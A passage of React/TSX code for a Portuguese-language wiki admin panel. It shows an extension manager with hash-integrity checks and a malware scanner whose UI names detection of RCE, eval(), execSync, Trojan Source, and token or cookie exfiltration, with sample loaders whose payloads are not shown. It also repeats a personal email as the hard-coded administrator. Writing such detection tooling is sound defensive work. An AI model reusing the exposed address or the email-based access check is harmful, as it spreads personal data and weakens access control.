                onClick={() => setExtensionSuiteMode('wiki-alternative')}
                className={`px-3 py-1.5 font-bold uppercase border-2 cursor-pointer transition-colors ${
                  extensionSuiteMode === 'wiki-alternative'
                    ? 'bg-[#141414] text-white border-[#141414]'
                    : 'bg-stone-100 text-stone-700 border-stone-300 hover:bg-stone-200'
                }`}
              >
                Wiki-alternative (Sistema Completo)
              </button>
              <button
                type="button"
                onClick={() => setExtensionSuiteMode('classic')}
                className={`px-3 py-1.5 font-bold uppercase border-2 cursor-pointer transition-colors ${
                  extensionSuiteMode === 'classic'
                    ? 'bg-[#141414] text-white border-[#141414]'
                    : 'bg-stone-100 text-stone-700 border-stone-300 hover:bg-stone-200'
                }`}
              >
                Catálogo NotMediaWiki (3.05.9)
              </button>
            </div>
          </div>

          {extensionSuiteMode === 'wiki-alternative' ? (
            <div className="bg-white border-2 border-[#141414] p-4 sm:p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)]">
              <AdminExtensionsManagementView currentUser={wikiExtensionUser} />
            </div>
          ) : (
        <div className="bg-white border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-6">
          {/* Header & Device Status */}
          <div className="border-b-2 border-[#141414] pb-4 flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div>
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-6 h-6 text-emerald-700" />
                <h3 className="font-editorial text-2xl font-bold text-stone-950">
                  Gerenciador de Extensões & Dispositivos de Segurança
                </h3>
              </div>
              <p className="text-xs font-mono text-stone-600 mt-1">
                Conformidade com os dispositivos de sincronia criptográfica (3.05.9.a) e verificação forense antimalware (3.05.9.b).
              </p>
            </div>

            <div className="flex items-center gap-2 flex-wrap">
              <button
                onClick={() => setIsCatalogModalOpen(true)}
                className="px-3.5 py-2 bg-amber-500 hover:bg-amber-400 text-stone-950 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-2 border-2 border-black shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] active:translate-x-0.5 active:translate-y-0.5 cursor-pointer"
                title={!isBureaucrat ? 'Exclusivo para o Burocrata pedrohenriquecardonaperes@gmail.com' : 'Adicionar e alterar extensões (3.05.3.a)'}
              >
                <Plus className="w-3.5 h-3.5" />
                <span>Adicionar Extensão Existente (3.05.3.a)</span>
              </button>

              <button
                onClick={handleSyncAllExtensions}
                disabled={isSyncingExtensions}
                className="px-3.5 py-2 bg-stone-900 text-white hover:bg-stone-800 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-2 border-2 border-black shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] active:translate-x-0.5 active:translate-y-0.5 disabled:opacity-60 cursor-pointer"
                title={!isBureaucrat ? 'Exclusivo para o Burocrata pedrohenriquecardonaperes@gmail.com' : 'Sincronizar e validar integridade'}
              >
                <RefreshCw className={`w-3.5 h-3.5 ${isSyncingExtensions ? 'animate-spin' : ''}`} />
                <span>{isSyncingExtensions ? 'Validando Integridade...' : 'Sincronizar com Dispositivo de Segurança'}</span>
              </button>
            </div>
          </div>

          {/* Security Device Information Cards */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
            {/* Dispositivo 3.05.9.a */}
            <div className="p-4 bg-emerald-50/70 border-2 border-emerald-600 shadow-[3px_3px_0px_0px_rgba(5,150,105,1)]">
              <div className="flex items-center justify-between mb-2">
                <span className="font-bold text-emerald-900 uppercase text-[10px] flex items-center gap-1.5">
                  <Shield className="w-3.5 h-3.5 text-emerald-700" /> Dispositivo 3.05.9.a
                </span>
                <span className="bg-emerald-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase">
                  Sincronia Criptográfica Ativa
                </span>
              </div>
              <h4 className="font-editorial text-base font-bold text-stone-950">
                Dispositivo de Segurança para Sincronia de Extensões
              </h4>
              <ul className="mt-2 space-y-1 text-stone-700 text-[11px] list-disc list-inside">
                <li>Validação de assinatura SHA-256 NIST FIPS 180-4 em tempo real.</li>
                <li>Restrição estrita à Whitelist oficial ({ALLOWED_EXTENSION_DOMAINS.length} domínios autorizados).</li>
                <li>Autoridade criptográfica exclusiva: <strong className="text-stone-900">pedrohenriquecardonaperes@gmail.com</strong>.</li>
              </ul>
            </div>

            {/* Dispositivo 3.05.9.b */}
            <div className="p-4 bg-purple-50/70 border-2 border-purple-600 shadow-[3px_3px_0px_0px_rgba(147,51,234,1)]">
              <div className="flex items-center justify-between mb-2">
                <span className="font-bold text-purple-900 uppercase text-[10px] flex items-center gap-1.5">
                  <Bug className="w-3.5 h-3.5 text-purple-700" /> Dispositivo 3.05.9.b
                </span>
                <span className="bg-purple-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase">
                  Varredura Antimalware Ativa
                </span>
              </div>
              <h4 className="font-editorial text-base font-bold text-stone-950">
                Dispositivo de Verificação de Informações Maliciosas
              </h4>
              <ul className="mt-2 space-y-1 text-stone-700 text-[11px] list-disc list-inside">
                <li>Análise estática contra RCE, eval(), execSync e Trojan Source (Bidi).</li>
                <li>Mitigação de exfiltração de tokens/cookies e poluição de protótipo.</li>
                <li>Quarentena preventiva automática e cálculo de Entropia de Shannon.</li>
              </ul>
            </div>
          </div>

          {/* Sync Feedback Alert */}
          {syncFeedback && (
            <div
              className={`p-4 border-2 font-mono text-xs ${
                syncFeedback.success
                  ? 'bg-emerald-50 border-emerald-600 text-emerald-950 shadow-[3px_3px_0px_0px_rgba(5,150,105,1)]'
                  : 'bg-red-50 border-red-600 text-red-950 shadow-[3px_3px_0px_0px_rgba(220,38,38,1)]'
              }`}
            >
              <div className="flex items-start justify-between gap-2">
                <div className="flex items-center gap-2 font-bold">
                  {syncFeedback.success ? (
                    <CheckCircle className="w-4 h-4 text-emerald-700" />
                  ) : (
                    <AlertTriangle className="w-4 h-4 text-red-700" />
                  )}
                  <span>{syncFeedback.message}</span>
                </div>
                <button
                  onClick={() => setSyncFeedback(null)}
                  className="text-stone-500 hover:text-stone-900 cursor-pointer"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              {syncFeedback.reasons && syncFeedback.reasons.length > 0 && (
                <ul className="mt-2 space-y-1 pl-6 list-disc text-[11px]">
                  {syncFeedback.reasons.map((r, i) => (
                    <li key={i}>{r}</li>
                  ))}
                </ul>
              )}
            </div>
          )}

          {/* Extension Cards Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
            {extensions.map((ext) => {
              const isQuarantined = ext.quarantined || ext.signatureStatus === 'quarantined';
              const isTampered = ext.signatureStatus === 'tampered';
              const isVerified = ext.signatureStatus === 'verified' && !isQuarantined;

              return (
                <div
                  key={ext.id}
                  className={`p-4 border-2 flex flex-col justify-between transition-all ${
                    isQuarantined
                      ? 'border-red-600 bg-red-50/50 shadow-[4px_4px_0px_0px_rgba(220,38,38,1)]'
                      : isTampered
                      ? 'border-amber-600 bg-amber-50/50 shadow-[4px_4px_0px_0px_rgba(217,119,6,1)]'
                      : 'border-stone-300 bg-[#FAF9F5] shadow-[4px_4px_0px_0px_rgba(0,0,0,0.1)]'
                  }`}
                >
                  <div>
                    {/* Badges Bar */}
                    <div className="flex items-center justify-between mb-2 gap-2 flex-wrap">
                      <div className="flex items-center gap-1.5">
                        <span className="bg-stone-900 text-white font-bold px-2 py-0.5 text-[9px] uppercase">
                          {ext.category}
                        </span>
                        <span className="bg-stone-200 text-stone-800 font-bold px-1.5 py-0.5 text-[9px]">
                          v{ext.version}
                        </span>
                      </div>

                      {/* Security Status Badge */}
                      {isQuarantined ? (
                        <span className="bg-red-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
                          <AlertOctagon className="w-3 h-3" /> Quarentena (Malware)
                        </span>
                      ) : isTampered ? (
                        <span className="bg-amber-600 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
                          <AlertTriangle className="w-3 h-3" /> Digest Adulterado
                        </span>
                      ) : (
                        <span className="bg-emerald-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
                          <ShieldCheck className="w-3 h-3" /> SHA-256 Verificado
                        </span>
                      )}
                    </div>

                    <h4 className="font-editorial text-lg font-bold text-stone-950 flex items-center justify-between">
                      <span>{ext.namePt}</span>
                      <span className={`text-[10px] font-mono px-2 py-0.5 border ${
                        ext.enabled
                          ? 'bg-emerald-100 border-emerald-500 text-emerald-900 font-bold'
                          : 'bg-stone-200 border-stone-400 text-stone-600'
                      }`}>
                        {ext.enabled ? 'ATIVADA' : 'DESATIVADA'}
                      </span>
                    </h4>

                    <p className="font-serif text-xs text-stone-600 mt-1 leading-relaxed">
                      {ext.description}
                    </p>

                    {/* Cryptographic Manifest Information */}
                    <div className="mt-3 p-2.5 bg-stone-100 border border-stone-300 text-[10px] space-y-1">
                      <div className="flex items-center justify-between">
                        <span className="text-stone-500 font-bold">DIGEST SHA-256:</span>
                        <span className="font-mono text-stone-900 font-bold">{ext.sha256?.slice(0, 16)}...</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-stone-500 font-bold">ORIGEM NA WHITELIST:</span>
                        <span className="text-emerald-800 font-bold flex items-center gap-1">
                          <Check className="w-3 h-3" /> {ext.originDomain}
                        </span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-stone-500 font-bold">AUDITORIA DE SEGURANÇA:</span>
                        <span className={`font-bold ${ext.securityAudit?.safetyScore && ext.securityAudit.safetyScore >= 90 ? 'text-emerald-700' : 'text-amber-700'}`}>
                          Score: {ext.securityAudit?.safetyScore ?? 100}/100 ({ext.securityAudit?.threatLevel ?? 'SECURE'})
                        </span>
                      </div>
                      <div className="flex items-center justify-between border-t border-stone-200 pt-1 mt-1">
                        <span className="text-stone-500 font-bold">INTEGRIDADE NO FIRESTORE:</span>
                        {firestoreIntegrityMap[ext.id]?.valid ? (
                          <span className="text-emerald-700 font-bold flex items-center gap-1">
                            <Check className="w-3 h-3" /> Hash & Assinatura Íntegras
                          </span>
                        ) : firestoreIntegrityMap[ext.id]?.status === 'tampered' ? (
                          <span className="text-red-700 font-bold flex items-center gap-1">
                            <AlertOctagon className="w-3 h-3" /> Divergência de Hash!
                          </span>
                        ) : firestoreIntegrityMap[ext.id]?.status === 'quarantined' ? (
                          <span className="text-red-700 font-bold flex items-center gap-1">
                            <Lock className="w-3 h-3" /> Bloqueada no Firestore
                          </span>
                        ) : (
                          <span className="text-stone-600 font-bold flex items-center gap-1">
                            <RefreshCw className="w-3 h-3 animate-spin" /> Verificando...
                          </span>
                        )}
                      </div>
                    </div>
                    {/* Live Config Summary Badge */}
                    {ext.config && Object.keys(ext.config).length > 0 && (
                      <div className="mt-2.5 p-2 bg-amber-50/80 border border-amber-300 font-mono text-[10px] space-y-0.5 text-stone-800">
                        <div className="font-bold text-amber-950 flex items-center gap-1">
                          <Sliders className="w-3 h-3 text-amber-700" />
                          <span>Configuração Ativa:</span>
                        </div>
                        {ext.id === 'ext-support-tickets' && (
                          <div className="leading-snug">
                            Suporte URL: <strong className="text-sky-800 break-all">{ext.config.supportUrl || 'https://support.wazzimagiygg.com/'}</strong> • Modo: <span className="font-bold">{ext.config.openMode || 'redirect'}</span>
                          </div>
                        )}
                        {ext.id === 'ext-external-redirector' && (
                          <div className="leading-snug">
                            Redirecionador: <strong className={ext.config.enabled ? 'text-emerald-700' : 'text-red-700'}>{ext.config.enabled ? 'Ativo' : 'Desativado'}</strong> • Base: <code className="bg-amber-100 px-1 font-bold">{ext.config.redirectBaseUrl || 'https://wazzimagiygg.com/rv/?uid='}</code>
                          </div>
                        )}
                        {ext.id === 'ext-maintenance-mode' && (
                          <div className="leading-snug">
                            Manutenção: <strong className={ext.config.isMaintenanceActive ? 'text-rose-600 font-bold' : 'text-stone-600'}>{ext.config.isMaintenanceActive ? '🔴 Manutenção ATIVA' : '⚪ Desativada'}</strong> • {ext.config.estimatedReturn || 'Normal'}
                          </div>
                        )}
                        {ext.id !== 'ext-support-tickets' && ext.id !== 'ext-external-redirector' && ext.id !== 'ext-maintenance-mode' && (
                          <div className="text-stone-600 truncate">
                            {JSON.stringify(ext.config)}
                          </div>
                        )}
                      </div>
                    )}
                  </div>

                  {/* Actions & Status Controls */}
                  <div className="pt-3 border-t border-stone-200 mt-3 flex items-center justify-between text-[10px] gap-2 flex-wrap">
                    <button
                      onClick={() => {
                        setInspectingExtension(ext);
                        setInspectingFile(ext.files?.[0] || null);
                      }}
                      className="px-2.5 py-1.5 bg-stone-200 hover:bg-stone-300 text-stone-900 font-bold border border-stone-400 flex items-center gap-1.5 cursor-pointer"
                    >
                      <FileCode className="w-3.5 h-3.5 text-stone-700" />
                      <span>Arquivos ({ext.files?.length || 1})</span>
                    </button>

                    <div className="flex items-center gap-1.5 flex-wrap">
                      <button
                        onClick={() => setConfigModalExt(ext)}
                        className="px-2.5 py-1.5 bg-amber-100 hover:bg-amber-200 text-amber-950 font-bold border border-amber-600 flex items-center gap-1 cursor-pointer"
                        title="Modificar parâmetros e código da extensão (3.05.3.a)"
                      >
                        <Sliders className="w-3.5 h-3.5 text-amber-700" />
                        <span>Configurar</span>
                      </button>

                      <button
                        onClick={() => handleToggleExtension(ext)}
                        disabled={!isBureaucrat || isQuarantined}
                        className={`px-3 py-1.5 font-bold border flex items-center gap-1 cursor-pointer transition-colors ${
                          isQuarantined
                            ? 'bg-stone-200 text-stone-400 border-stone-300 cursor-not-allowed'
                            : ext.enabled
                            ? 'bg-amber-100 text-amber-900 border-amber-600 hover:bg-amber-200'
                            : 'bg-emerald-600 text-white border-emerald-800 hover:bg-emerald-700'
                        }`}
                        title={
                          !isBureaucrat
                            ? 'Somente pedrohenriquecardonaperes@gmail.com pode alterar'
                            : isQuarantined
                            ? 'Extensão bloqueada por malware em quarentena'
                            : ext.enabled
                            ? 'Desativar extensão'
                            : 'Ativar extensão'
                        }
                      >
                        {isQuarantined ? (
                          <>
                            <Lock className="w-3 h-3" /> Quarentena
                          </>
                        ) : ext.enabled ? (
                          <>
                            <Unlock className="w-3 h-3" /> Desativar
                          </>
                        ) : (
                          <>
                            <Check className="w-3 h-3" /> Ativar
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>

          {/* ===================================================================== */}
          {/* DISPOSITIVO 3.05.9.b: VERIFICADOR FORENSE SANDBOX INTERATIVO          */}
          {/* ===================================================================== */}
          <div className="border-2 border-[#141414] bg-[#FAF9F5] p-5 shadow-[4px_4px_0px_0px_rgba(20,20,20,1)] space-y-4">
            <div className="border-b-2 border-stone-300 pb-3 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
              <div>
                <h4 className="font-editorial text-xl font-bold text-stone-950 flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-purple-700" />
                  <span>Dispositivo 3.05.9.b: Verificador Forense de Código de Extensões</span>
                </h4>
                <p className="text-xs font-mono text-stone-600 mt-0.5">
                  Análise estática profunda: detecção de RCE, Trojan Source, ofuscação e exfiltração em arquivos de extensões.
                </p>
              </div>

              {/* Sample Loader Buttons */}
              <div className="flex items-center gap-1.5 flex-wrap">
                <span className="text-[10px] font-mono text-stone-500 font-bold mr-1">Carregar Amostras:</span>
                <button
                  onClick={() => loadForensicSample('safe')}
                  className="px-2 py-1 bg-white hover:bg-emerald-50 text-emerald-800 border border-emerald-600 text-[10px] font-mono font-bold cursor-pointer"
                >
                  ✓ Segura
                </button>
                <button
                  onClick={() => loadForensicSample('exfil')}
                  className="px-2 py-1 bg-white hover:bg-red-50 text-red-700 border border-red-600 text-[10px] font-mono font-bold cursor-pointer"
                >
                  ⚠️ Exfiltração
                </button>
                <button
                  onClick={() => loadForensicSample('rce')}
                  className="px-2 py-1 bg-white hover:bg-amber-50 text-amber-800 border border-amber-600 text-[10px] font-mono font-bold cursor-pointer"
                >
                  ⚠️ RCE + Hex
                </button>
                <button
                  onClick={() => loadForensicSample('trojan')}
                  className="px-2 py-1 bg-white hover:bg-purple-50 text-purple-800 border border-purple-600 text-[10px] font-mono font-bold cursor-pointer"
                >
                  ⚠️ Trojan Source
                </button>
              </div>
            </div>

            {/* Code Input & File Name */}
            <div className="space-y-2">
              <div className="flex items-center gap-2">
                <label className="text-[11px] font-mono font-bold text-stone-700">Arquivo Alvo:</label>
                <input
                  type="text"
                  value={forensicFileName}
                  onChange={(e) => setForensicFileName(e.target.value)}
                  className="px-2 py-1 bg-white border border-stone-400 font-mono text-xs w-60"
                  placeholder="ex: hook.ts ou extension.json"
                />
              </div>

              <textarea
                value={forensicCode}
                onChange={(e) => setForensicCode(e.target.value)}
                rows={7}
                className="w-full p-3 font-mono text-xs bg-stone-900 text-stone-100 border-2 border-black focus:outline-none focus:ring-1 focus:ring-purple-600"
                placeholder="Cole ou edite o código da extensão para submeter ao scanner antimalware..."
              />
            </div>

            {/* Run Button */}
            <div className="flex items-center justify-between">
              <span className="text-[11px] font-mono text-stone-600">
                Digest SHA-256 do código inserido: <strong className="text-stone-900">{computeSha256Hex(forensicCode).slice(0, 20)}...</strong>
              </span>

              <button
                onClick={handleRunForensicScan}
                disabled={isScanningForensic}
                className="px-4 py-2 bg-purple-700 hover:bg-purple-800 text-white font-mono text-xs font-bold uppercase tracking-wider flex items-center gap-2 border-2 border-black shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] active:translate-x-0.5 active:translate-y-0.5 cursor-pointer"
              >
                <Bug className={`w-4 h-4 ${isScanningForensic ? 'animate-spin' : ''}`} />
                <span>{isScanningForensic ? 'Analisando Código...' : 'Executar Varredura Forense'}</span>
              </button>
            </div>

            {/* Forensic Scan Audit Report Panel */}
            {forensicAudit && (
              <div className={`p-4 border-2 font-mono text-xs ${
                forensicAudit.threatLevel === 'CRITICAL'
                  ? 'bg-red-50 border-red-600 text-red-950 shadow-[3px_3px_0px_0px_rgba(220,38,38,1)]'
                  : forensicAudit.threatLevel === 'MEDIUM_RISK'
                  ? 'bg-amber-50 border-amber-600 text-amber-950 shadow-[3px_3px_0px_0px_rgba(217,119,6,1)]'
                  : 'bg-emerald-50 border-emerald-600 text-emerald-950 shadow-[3px_3px_0px_0px_rgba(5,150,105,1)]'
              }`}>
                <div className="flex items-center justify-between pb-3 border-b border-stone-300">
                  <div className="flex items-center gap-2">
                    {forensicAudit.threatLevel === 'CRITICAL' ? (
                      <AlertOctagon className="w-5 h-5 text-red-700" />
                    ) : forensicAudit.threatLevel === 'MEDIUM_RISK' ? (
                      <AlertTriangle className="w-5 h-5 text-amber-700" />
                    ) : (
                      <CheckCircle className="w-5 h-5 text-emerald-700" />
                    )}
                    <div>
                      <span className="font-bold text-sm block">
                        Relatório Forense de Conformidade (Dispositivo 3.05.9.b)
                      </span>
                      <span className="text-[10px] text-stone-600">
                        Classificação de Risco: <strong>{forensicAudit.threatLevel}</strong> | Entropia de Shannon: <strong>{forensicAudit.entropyScore} bits/byte</strong>
                      </span>
                    </div>
                  </div>

                  <div className="text-right">
                    <span className="text-xl font-bold font-editorial">
                      {forensicAudit.safetyScore}/100
                    </span>
                    <span className="block text-[9px] uppercase tracking-wider font-bold">
                      Índice de Segurança
                    </span>
                  </div>
                </div>

                {forensicAudit.quarantined && (
                  <div className="mt-3 p-2.5 bg-red-700 text-white text-[11px] font-bold flex items-center gap-2">
                    <Lock className="w-4 h-4 shrink-0" />
                    <span>QUARENTENA PREVENTIVA DISPARADA: Esta extensão possui ameaças críticas e está impedida de ser sincronizada ou executada.</span>
                  </div>
                )}

                {/* Detected Threats List */}
                {forensicAudit.threats.length > 0 ? (
                  <div className="mt-3 space-y-2">
                    <span className="font-bold text-stone-900 block text-[11px] uppercase tracking-wider">
                      Ameaças Identificadas ({forensicAudit.threats.length}):
                    </span>
                    {forensicAudit.threats.map((threat, idx) => (
                      <div key={idx} className="p-3 bg-white border border-stone-300 text-stone-800 space-y-1">
                        <div className="flex items-center justify-between">
                          <span className={`px-1.5 py-0.5 text-[9px] font-bold uppercase ${
                            threat.severity === 'CRITICAL'
                              ? 'bg-red-700 text-white'
                              : threat.severity === 'HIGH'
                              ? 'bg-amber-600 text-white'
                              : 'bg-yellow-400 text-stone-900'
                          }`}>
                            [{threat.severity}] {threat.ruleId} ({threat.category})
                          </span>
                          <span className="text-[10px] text-stone-500 font-bold">Linha: {threat.lineNumber}</span>
                        </div>
                        <p className="text-xs font-bold text-stone-900">{threat.description}</p>
                        <div className="p-1.5 bg-stone-100 font-mono text-[11px] text-red-900 border-l-2 border-red-600 overflow-x-auto">
                          <code>{threat.snippet}</code>
                        </div>
                        <p className="text-[10px] text-stone-600">
                          <strong>Mitigação Recomendada:</strong> {threat.recommendation}
                        </p>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="mt-3 p-3 bg-white border border-emerald-400 text-emerald-900 text-xs font-bold flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-emerald-700" />
                    <span>Nenhum padrão malicioso detectado. Código em conformidade com as diretrizes do ecossistema WazzimaGiygg.</span>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* ===================================================================== */}
          {/* INSPECTOR MODAL: VIEW EXTENSION FILES & AUDIT MANIFEST               */}
          {/* ===================================================================== */}
          {inspectingExtension && (
            <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
              <div className="bg-white border-4 border-[#141414] max-w-3xl w-full max-h-[85vh] flex flex-col shadow-[8px_8px_0px_0px_rgba(20,20,20,1)]">
                {/* Modal Header */}
                <div className="p-4 bg-stone-100 border-b-2 border-[#141414] flex items-center justify-between">
                  <div>
                    <h3 className="font-editorial text-xl font-bold text-stone-950 flex items-center gap-2">
                      <FileCode className="w-5 h-5 text-purple-700" />
                      <span>{inspectingExtension.namePt}</span>
                      <span className="text-xs font-mono font-normal text-stone-600">({inspectingExtension.originDomain})</span>
                    </h3>
                    <p className="text-[11px] font-mono text-stone-600">
                      Digest SHA-256 do pacote: <strong>{inspectingExtension.sha256}</strong>
                    </p>
                  </div>
                  <button
                    onClick={() => {
                      setInspectingExtension(null);
                      setInspectingFile(null);
                    }}
                    className="p-1 hover:bg-stone-200 cursor-pointer"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>

                {/* Modal Content */}
                <div className="p-4 overflow-y-auto space-y-4 font-mono text-xs">
                  {/* File selector tabs */}
                  <div className="flex items-center gap-1 border-b border-stone-300 pb-2">
                    <span className="text-stone-500 font-bold mr-2 text-[10px] uppercase">Arquivos:</span>
                    {inspectingExtension.files?.map((f) => (
                      <button
                        key={f.name}
                        onClick={() => setInspectingFile(f)}
                        className={`px-2.5 py-1 text-xs border ${
                          inspectingFile?.name === f.name
                            ? 'bg-stone-900 text-white border-black font-bold'
                            : 'bg-stone-100 text-stone-700 border-stone-300 hover:bg-stone-200'
                        }`}
                      >
                        {f.name}
                      </button>
                    ))}
                  </div>

                  {/* Active File Details */}
                  {inspectingFile && (
                    <div className="space-y-2">
                      <div className="flex items-center justify-between text-[11px] bg-stone-100 p-2 border border-stone-300">
                        <span>Arquivo: <strong>{inspectingFile.name}</strong> ({inspectingFile.size} bytes)</span>
                        <span>Digest SHA-256: <strong>{inspectingFile.sha256.slice(0, 16)}...</strong></span>
                      </div>
                      <pre className="p-3 bg-stone-900 text-stone-100 text-[11px] max-h-60 overflow-y-auto border border-black font-mono">
                        {inspectingFile.content}
                      </pre>
                    </div>
                  )}

                  {/* Audit details for this extension */}
                  {inspectingExtension.securityAudit && (
                    <div className="p-3 bg-stone-50 border-2 border-stone-300 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-stone-900 uppercase text-[10px]">
                          Auditoria Forense Integrada
                        </span>
                        <span className="text-emerald-700 font-bold">
                          Score: {inspectingExtension.securityAudit.safetyScore}/100 ({inspectingExtension.securityAudit.threatLevel})
                        </span>
                      </div>
                      <p className="text-[11px] text-stone-600">
                        Última sincronia autenticada por: <strong>{inspectingExtension.syncAuthorizedBy || 'pedrohenriquecardonaperes@gmail.com'}</strong> em{' '}
                        {new Date(inspectingExtension.lastSyncTimestamp).toLocaleString('pt-BR')}.
                      </p>
                    </div>
                  )}

                  {/* Firestore Integrity Layer (Validação de Assinaturas e Hashes Registrados) */}
                  {(() => {
                    const integrityCheck = firestoreIntegrityMap[inspectingExtension.id];
                    return (
                      <div className="p-3 bg-stone-50 border-2 border-stone-300 space-y-3">
                        <div className="flex items-center justify-between pb-2 border-b border-stone-300">
                          <span className="font-bold text-stone-900 uppercase text-[10px] flex items-center gap-1.5">
                            <Database className="w-3.5 h-3.5 text-blue-700" />
                            Camada de Integridade no Firestore (Hashes & Assinaturas)
                          </span>
                          {integrityCheck?.valid ? (
                            <span className="bg-emerald-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
                              <ShieldCheck className="w-3 h-3" /> Assinatura Válida
                            </span>
                          ) : (
                            <span className="bg-red-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
                              <AlertOctagon className="w-3 h-3" /> {integrityCheck?.status || 'Pendente'}
                            </span>
                          )}
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[10px]">
                          <div className="p-2 bg-white border border-stone-200">
                            <span className="text-stone-500 font-bold block">Hash Registrado no Firestore:</span>
                            <span className="font-mono text-stone-900 font-bold break-all">
                              {integrityCheck?.expectedHash || inspectingExtension.sha256}
                            </span>
                          </div>
                          <div className="p-2 bg-white border border-stone-200">
                            <span className="text-stone-500 font-bold block">Hash Calculado dos Arquivos:</span>
                            <span className="font-mono text-stone-900 font-bold break-all">
                              {integrityCheck?.computedHash || computeSha256Hex(inspectingFile?.content || '')}
                            </span>
                          </div>
                        </div>

                        {/* Files Integrity Comparison */}
                        {integrityCheck?.filesIntegrity && integrityCheck.filesIntegrity.length > 0 && (
                          <div className="space-y-1">
                            <span className="text-[10px] font-bold text-stone-700 uppercase">
                              Conferência de Arquivos vs. Hashes no Firestore:
                            </span>
                            <div className="border border-stone-300 bg-white overflow-x-auto">
                              <table className="w-full text-[10px]">
                                <thead className="bg-stone-100 border-b border-stone-300">
                                  <tr>
                                    <th className="p-1.5 text-left font-bold text-stone-700">Arquivo</th>
                                    <th className="p-1.5 text-left font-bold text-stone-700">Hash Firestore</th>
                                    <th className="p-1.5 text-left font-bold text-stone-700">Hash Local</th>
                                    <th className="p-1.5 text-center font-bold text-stone-700">Status</th>
                                  </tr>
                                </thead>
                                <tbody>
                                  {integrityCheck.filesIntegrity.map((f, i) => (
                                    <tr key={i} className="border-b border-stone-200">
                                      <td className="p-1.5 font-bold text-stone-900">{f.fileName}</td>
                                      <td className="p-1.5 font-mono text-stone-600">{f.expectedHash.slice(0, 10)}...</td>
                                      <td className="p-1.5 font-mono text-stone-600">{f.computedHash.slice(0, 10)}...</td>
                                      <td className="p-1.5 text-center">
                                        {f.match ? (
                                          <span className="text-emerald-700 font-bold">✓ Coincide</span>
                                        ) : (
                                          <span className="text-red-700 font-bold">⚠️ Divergente</span>
                                        )}
                                      </td>
                                    </tr>
                                  ))}
                                </tbody>
                              </table>
                            </div>
                          </div>
                        )}

                        {/* Execution simulation action */}
                        <div className="pt-2 border-t border-stone-200 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2">
                          <button
                            onClick={() => handleTestSafeExecution(inspectingExtension)}
                            className="px-3 py-1.5 bg-blue-700 hover:bg-blue-800 text-white font-mono text-xs font-bold flex items-center gap-1.5 cursor-pointer"
                          >
                            <Cpu className="w-3.5 h-3.5" />
                            <span>Validar & Simular Execução (executeExtensionSafely)</span>
                          </button>

                          {isBureaucrat && (
                            <button
                              onClick={async () => {
                                const res = await registerExtensionHashInFirestore(inspectingExtension, currentUser?.email);
                                if (res.success) {
                                  showToast('Hash oficial registrado com sucesso no Firestore.');
                                  refreshFirestoreIntegrity(extensions);
                                } else {
                                  showToast(res.error || 'Erro ao registrar no Firestore.', true);
                                }
                              }}
                              className="px-3 py-1.5 bg-stone-800 hover:bg-black text-white font-mono text-xs font-bold flex items-center gap-1.5 cursor-pointer"
                            >
                              <Shield className="w-3.5 h-3.5" />
                              <span>Atualizar Assinatura no Firestore</span>
                            </button>
                          )}
                        </div>

                        {/* Execution Simulation Feedback */}
                        {executionTestResult && (
                          <div
                            className={`p-2.5 border text-[11px] ${
                              executionTestResult.success
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-red-50 border-red-500 text-red-950 font-bold'
                            }`}
                          >
                            <div className="flex items-center gap-1.5">
                              {executionTestResult.success ? (
                                <CheckCircle className="w-4 h-4 text-emerald-700 shrink-0" />
                              ) : (
                                <AlertOctagon className="w-4 h-4 text-red-700 shrink-0" />
                              )}
                              <span>{executionTestResult.message}</span>
                            </div>
                          </div>
                        )}
                      </div>
                    );
                  })()}
                </div>

                {/* Modal Footer */}
                <div className="p-3 bg-stone-100 border-t-2 border-[#141414] flex items-center justify-end">
                  <button
                    onClick={() => {
                      setInspectingExtension(null);
                      setInspectingFile(null);
                    }}
                    className="px-4 py-1.5 bg-stone-900 text-white font-mono text-xs font-bold cursor-pointer"
                  >
                    Fechar Inspetor
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
          )}
        </div>
      )}

      {/* ===================================================================== */}
      {/* TAB 8: GOVERNANÇA, ARBCOM & AUDITORIA FORENSE                          */}
      {/* ===================================================================== */}
      {activeTab === 'governance' && (
        <div className="bg-white border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-6 font-mono text-xs">
          <div className="border-b-2 border-[#141414] pb-4">
            <h3 className="font-editorial text-2xl font-bold text-stone-950 flex items-center gap-2">
              <Shield className="w-6 h-6 text-red-700" />
              <span>Painel de Governança, ArbCom & CheckUser</span>
            </h3>
            <p className="text-xs font-mono text-stone-600 mt-1">
